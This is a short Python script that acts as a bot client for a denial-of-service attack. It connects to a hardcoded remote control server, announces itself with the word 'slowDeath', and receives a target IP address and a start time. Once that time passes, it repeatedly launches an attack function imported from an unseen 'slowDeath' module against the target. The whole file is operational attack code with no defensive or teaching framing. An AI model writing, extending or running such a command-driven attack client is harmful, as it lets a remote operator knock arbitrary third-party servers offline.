#!/usr/bin/python
import socket
import sys
import datetime
import time
import thread
from slowDeath import main

message = 'slowDeath'
global ipAdd
global ping_time_str

#datetime.datetime(curr_time.year, curr_time.month, curr_time.day,curr_time.hour, curr_time.minute)
#datetime.timedelta(x,x) #where x,x is desired time (day,hour,minute,second,etc)

#Create a TCP/IP socket
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Connect the socket to the port where the server is listening
server_address = ('198.252.11.72', 35000)
print >>sys.stderr, 'Connecting To: %s => Port: %s' % server_address
soc.connect(server_address)

try:
	#send data
	print >>sys.stderr, '\nSending: "%s"\n' % message
	soc.sendall(message)
	
	ipAdd = soc.recv(1024)
	ping_time_str = soc.recv(1024)
	
	print >>sys.stderr, ipAdd
	
	while True:
		curr_time = datetime.datetime.now()
		ping_time_time = datetime.datetime(*map(int,ping_time_str.split('-')))
		if curr_time > ping_time_time:
			main(ipAdd)
		

finally:
	print >>sys.stderr, '\nClosing Socket'
	soc.close()
